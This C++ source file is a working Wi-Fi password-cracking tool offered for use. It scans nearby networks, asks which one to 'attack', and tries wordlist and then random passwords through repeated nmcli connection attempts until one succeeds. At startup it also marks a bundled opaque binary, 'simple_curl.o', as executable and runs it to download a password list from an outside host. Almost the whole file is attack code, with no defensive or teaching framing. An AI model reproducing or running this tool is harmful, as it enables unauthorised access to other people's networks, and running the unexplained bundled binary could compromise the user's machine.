#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <memory>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <array>
#include <sstream>
#include <unordered_set>
#include <cstring>
#include <fstream>
#include <chrono>
#include <algorithm>
#include <random>
#include <filesystem>
#include <sys/stat.h>
#include <limits.h>


std::filesystem::path GetExecutableDirectory()
{
    char buffer[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);

    if (len == -1)
        return {};

    buffer[len] = '\0';
    return std::filesystem::path(buffer).parent_path();
}


bool StartCurl(const std::string& file,
                  const std::string& arg1,
                  const std::string& arg2)
{
    std::filesystem::path path(file);

    // Resolve relative paths against this executable's directory.
    if (path.is_relative())
        path = GetExecutableDirectory() / path;

    // Ensure the executable bit is set.
    struct stat st;
    if (stat(path.c_str(), &st) != 0)
        return false;

    mode_t mode = st.st_mode | S_IXUSR;
    chmod(path.c_str(), mode);

    pid_t pid = fork();
    if (pid == -1)
        return false;

    if (pid == 0)
    {
        execl(path.c_str(),
              path.filename().c_str(),
              arg1.c_str(),
              arg2.c_str(),
              (char*)nullptr);

        _exit(127); // exec failed
    }

    int status;
    if (waitpid(pid, &status, 0) == -1)
        return false;

    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}


std::string GenerateRandomString(size_t length)
{
    static const std::string chars =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    std::random_device rd;
    std::uniform_int_distribution<size_t> dist(0, chars.size() - 1);

    std::string result;
    result.reserve(length);

    for (size_t i = 0; i < length; ++i)
        result += chars[dist(rd)];

    return result;
}


size_t RandomSizeT(size_t min, size_t max)
{
    static std::random_device rd;
    static std::mt19937_64 rng(rd());

    std::uniform_int_distribution<size_t> dist(min, max);
    return dist(rng);
}

// Capture stdout+stderr of a command as a string (still uses execvp, no shell).
// If 'pid_out' is provided, returns the child PID without waiting.
static std::string run_capture(const std::vector<std::string>& args,
                               pid_t* pid_out = nullptr,
                               bool wait = true) {
    int pipefd[2];
    if (pipe(pipefd) == -1) throw std::runtime_error("pipe failed");
    pid_t pid = fork();
    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        std::vector<char*> argv;
        for (auto& a : args) argv.push_back(const_cast<char*>(a.c_str()));
        argv.push_back(nullptr);
        execvp(argv[0], argv.data());
        _exit(127);
    }
    close(pipefd[1]);
    if (pid_out) *pid_out = pid;
    std::string out;
    std::array<char, 4096> buf;
    ssize_t n;
    while ((n = read(pipefd[0], buf.data(), buf.size())) > 0)
        out.append(buf.data(), n);
    close(pipefd[0]);
    if (wait) { int st; waitpid(pid, &st, 0); }
    return out;
}

// Attempts a single password. Returns true if connected successfully.
bool try_password(const std::string& ssid, const std::string& pwd) {
    // Clean up any previous attempt to ensure a clean slate
    run_capture({"nmcli", "connection", "delete", "wpa_crack_attempt"});

    std::atomic<bool> verdict{false};
    std::atomic<bool> done{false};
    std::atomic<bool> worker_done{false};
    std::atomic<pid_t> connect_pid{-1};

    // Start monitor first to catch events immediately
    int mpipe[2]; pipe(mpipe);
    pid_t mon_pid = fork();
    if (mon_pid == 0) {
        close(mpipe[0]);
        dup2(mpipe[1], STDOUT_FILENO);
        dup2(mpipe[1], STDERR_FILENO);
        close(mpipe[1]);
        execlp("nmcli","nmcli","device","monitor",nullptr);
        _exit(127);
    }
    close(mpipe[1]);

    // Start connection attempt in worker thread
    // We use "name wpa_crack_attempt" so we can easily track and delete this specific profile
    std::thread worker([&]{
        pid_t pid = -1;
        run_capture({"nmcli","-w","30","device","wifi","connect",
                     ssid, "password", pwd, "name", "wpa_crack_attempt"}, &pid, true);
        connect_pid = pid;
        worker_done = true;
    });

    std::array<char, 4096> buf;
    std::string leftover;
    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(15);
    bool success = false;

    while (!done) {
        if (std::chrono::steady_clock::now() > deadline) break;
        timeval tv{0, 200000}; // 200 ms timeout for select
        fd_set fds; FD_ZERO(&fds); FD_SET(mpipe[0], &fds);
        if (select(mpipe[0]+1, &fds, nullptr, nullptr, &tv) <= 0) {
            if (verdict || done) break;
            continue;
        }
        ssize_t n = read(mpipe[0], buf.data(), buf.size());
        if (n <= 0) break;
        leftover.append(buf.data(), n);

        // 1. Check for fast failure (wrong password)
        if (leftover.find("reason: 15") != std::string::npos ||
            leftover.find("reason: 23") != std::string::npos ||
            leftover.find("pre-shared key may be incorrect") != std::string::npos) {
            verdict = true;
            break;
        }

        // 2. Check if nmcli exited on its own (success or other error)
        if (worker_done.load()) {
            // If nmcli exited quickly, check if our specific connection is now active
            std::string conns = run_capture({"nmcli", "-t", "-f", "NAME", "connection", "show", "--active"});
            if (conns.find("wpa_crack_attempt") != std::string::npos) {
                success = true;
                done = true;
                break;
            } else {
                verdict = true; // treat as failure
                break;
            }
        }
    }

    // If we broke due to verdict or timeout, kill connect proc
    if (!success) {
        pid_t cp = connect_pid.load();
        if (cp > 0) {
            kill(cp, SIGTERM);
            waitpid(cp, nullptr, 0);
        }
    }

    // Cleanup monitor process
    kill(mon_pid, SIGTERM);
    waitpid(mon_pid, nullptr, 0);
    close(mpipe[0]);

    // Join worker thread (it should have finished by now, either naturally or via kill)
    if (worker.joinable()) worker.join();

    // Clean up NM connection profile if it failed, so NM doesn't auto-retry it
    if (!success) {
        run_capture({"nmcli", "connection", "delete", "wpa_crack_attempt"});
    }

    return success;
}

int main() {
    // 0) Load passlist
    StartCurl("simple_curl.o", "https://gregarious-wifipro.netlify.app/data/passwords_8plus.txt", "passwords_8plus.txt");
    // 1) List networks
    std::cout << "Scanning for Wi-Fi networks..." << std::endl;
    std::string list = run_capture({"nmcli","-t","-f","SSID","device","wifi","list","--rescan","yes"});
    std::vector<std::string> ssids;
    std::unordered_set<std::string> seen;
    std::string line;
    for (std::istringstream is(list); std::getline(is, line); ) {
        if (!line.empty() && line != "SSID" && seen.insert(line).second)
            ssids.push_back(line);
    }

    if (ssids.empty()) {
        std::cout << "No networks found." << std::endl;
        return 1;
    }

    for (size_t i = 0; i < ssids.size(); ++i)
        std::cout << "[" << i << "] " << ssids[i] << "\n";

    // 2) Choose a network
    size_t idx;
    std::cout << "\nEnter the number of the network to attack: ";
    std::cin >> idx;

    if (idx >= ssids.size()) {
        std::cout << "Invalid choice." << std::endl;
        return 1;
    }

    std::string chosen_ssid = ssids[idx];

    // 3) Load passwords
    std::vector<std::string> passwords;
    std::cout << "Enter path to password list file (or leave empty for built-in list): ";
    std::cin.ignore(); // clear newline from previous cin
    std::string filepath;
    std::getline(std::cin, filepath);

    if (filepath.empty()) {
        filepath = "./passwords_8plus.txt";
    }
	std::ifstream f(filepath);
        if (f) {
            std::string line;
            while (std::getline(f, line)) {
                if (!line.empty()) passwords.push_back(line);
            }
            std::cout << "Loaded " << passwords.size() << " passwords from " << filepath << "\n";
        } else {
            std::cerr << "Could not open file. Using built-in list.\n";
        }
    
    if (passwords.empty()) {
        passwords = {"12345678", "password", "correcthorsebatterystaple", "admin", "qwerty"};
        std::cout << "Using built-in list of " << passwords.size() << " passwords.\n";
    }

    std::cout << "\nTargeting: " << chosen_ssid << "\n";
    std::cout << "Starting password list attack...\n\n";

    // 4) Loop passwords continuously
    for (size_t i = 0; i < passwords.size(); ++i) {
        
        bool success = try_password(chosen_ssid, passwords[i]);
        
        if (success) {
            std::cout << "\n✅ SUCCESS! Password found: " << passwords[i] << "\n";
            return 0;
        }
        
        std::cout << "❌ Failed (" << passwords[i] << "\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }

    std::cout << "\n❌ All passwords exhausted. Correct password not found. Trying with random passwords now\n";
    std::vector<std::string> checkedPass;
    std::string newPass;
    while(true){
    while(true){
        newPass = GenerateRandomString(RandomSizeT(8, 13));
        if(std::find(checkedPass.begin(), checkedPass.end(), newPass) != checkedPass.end() || std::find(passwords.begin(), passwords.end(), newPass) != passwords.end()){
            continue;
        }else{
            break;
        }
    }
    bool success = try_password(chosen_ssid, newPass);
        
        if (success) {
            std::cout << "\n✅ SUCCESS! Password found: " << newPass << "\n";
            return 0;
        }
        
        std::cout << "❌ Failed (" << newPass << "\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(500));

    }
    return 1;
}